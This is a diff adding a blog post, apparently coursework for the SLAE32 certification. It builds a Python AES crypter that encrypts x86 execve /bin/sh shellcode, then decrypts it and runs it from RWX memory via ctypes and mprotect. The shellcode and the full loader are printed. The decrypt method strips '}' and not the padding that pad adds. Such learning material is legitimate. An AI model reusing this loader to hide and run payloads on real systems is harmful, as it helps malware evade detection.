@@ -1,0 +1,165 @@
+---
+layout: post
+title:  "SLAE32 - AES encrypted shellcode"
+date:   2019-12-17 21:03:36 +0530
+categories: x86 ASM AES SHELLCODE
+---
+
+In this blog post we going to create a custom crypter using AES Encryption schema. We going to create a python class to encrypt & decrypt a shellcode with the help of Crypto module. Also we going to use the ctypes in order to execute our shellcode from python script.
+
+
+### What is AES (Advanced Encryption Standard) ?
+
+The AES cipher according to wikipedia is an encryption standards which subset the Rjindael block cipher. AES is based on a design principle know as a substitution-permutation network, and is efficient in sofware and hardware. AES has fixed block size of 128 bits, and a key size of 128, 192, 256 bits. AES is a symmetric block cipher.
+
+This schema can be implemented in any programing language but for this assignment we going to use python. 
+
+### Python AES implementation
+
+Python has a module called Crypto.Cipher which contains algorithms for encrypt data. In order to use this library we import the neccesary modules.
+
+```python
+from Crypto.Cipher import AES
+from Crypto import Random 
+
+```
+
+Next we create a custom class which wrap the encryption and decryption functions.
+
+
+```python
+
+class AESCipher(object):
+    
+    def __init__(self, key):
+        self.bs = AES.block_size
+        self.key = hashlib.sha256(key.encode()).digest()
+
+    def encrypt(self, s):
+        c = AES.new(self.key)
+        return base64.b64encode(c.encrypt(self.pad(s)))
+
+
+    def decrypt(self,e):
+        c = AES.new(self.key)
+        return c.decrypt(base64.b64decode(e)).rstrip("}")
+
+    def pad(self,s):
+        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
+
+```
+
+The AESCipher class define a constructor which set the block size and the key in the object initialization. Next in the class we define the encrypt method which create a new AES cipher using the `AES.new(self.key)` instruction. This instruction receive the secret key as an argument, this key is used by the symmetric cipher.
+
+We encrypt data using the encrypt function of the AES object and encode using base64 encoding. The decryption function take the encrypted data and call the decrypt AES function to return the data decoded from base64.
+
+
+### Encryption
+
+To test the encryption we create a AESCipher object, we pass the key as an argument to the constructor. Later 
+we call the encrypt method and pass the shellcode as an argument.
+    
+```python
+aes = AESCipher('somekeyhere') # Define the key here
+
+encoded = aes.encrypt(shellcode)
+print 'Encrypted string:', encoded
+```
+
+The final output is the shellcode encoded in base64 and encrypted using the AES encryption schema.
+
+```plaintext
+motu@motu-pc:~/ASM/Assignment-7$ python shellcode.py 
+Encrypted string: f/CrwHeBg0it+7sccB72QA4QS1k53mLXw+fufdZVZuU=
+```
+
+### Decryption
+
+We next decrypt the data using the decrypt function. Using the same instance of AESCipher we call the decrypt function passing the encoded data as an argument.
+
+```python
+# decode the encoded string
+decoded = aes.decrypt(encoded)
+print 'Decrypted string:', decoded
+
+```
+
+The output of the decrypt function is:
+
+```plaintext
+Decrypted string: 1Ph//shh/binPS    
+```
+
+### Using ctypes 
+
+There is a way to call the shellcode from python using ctypes. First we import the neccesary libraries into the script.
+
+```python
+from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
+from sys import argv
+```
+
+These modules provides C compatibility data types and allows calling functions in DLL or shared libraries. We use it to wrap these libraries into our python code.
+
+We next load standard library or libc which provide macros, types definitions and functions for task such as string handling, io processing, memory management and OS services.
+
+```python
+# LIBC 
+libc = CDLL('libc.so.6')
+```
+
+We next save the execve shellcode in a variable.
+
+
+```plaintext
+# execve shellcode
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+```
+
+Using the ctypes we create a variable `sc` which hold the shellcode in the form of a char data type. The size of the shellcode is saves in the `size` variable. 
+
+Next using the `libc.valloc` function we allocate the shellcode in memory, this function returns a pointer to the allocated address. 
+
+Next with the `memmove` function we copy the shellcode to the address allocated. The `mprotect` function modifies the access protection of a memory region. In this case the memory region where our shellcode is save. Finally using the function `cast()` we cast the instance into a void pointer.
+
+```python
+
+sc = c_char_p(decoded)  
+size = len(decoded)
+
+addr = c_void_p(libc.valloc(size))
+
+memmove(addr, sc, size)
+libc.mprotect(addr, size, 0x7)
+
+run = cast(addr, CFUNCTYPE(c_void_p))
+run()
+
+```
+
+### Testing the script
+
+```plaintext
+motu@motu-pc:~/ASM/Assignment-7$ python shellcode.py 
+Encrypted string: f/CrwHeBg0it+7sccB72QA4QS1k53mLXw+fufdZVZuU=
+Decrypted string: 1Ph//shh/binPS
+                                
+[*] Shellcode length: 25
+[*] Executing the shellcode ..
+$ whoami   
+motu
+$ id
+uid=1000(motu) gid=1001(motu) groups=1001(motu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lpadmin)
+$ 
+```
+
+
+### PRELUDE
+
+In this blog post we encrypt and decrypt a shellcode using AES Encryption. With the help of Crypto lib and using ctypes from python we create a working demo.
+
+
+***
+
+
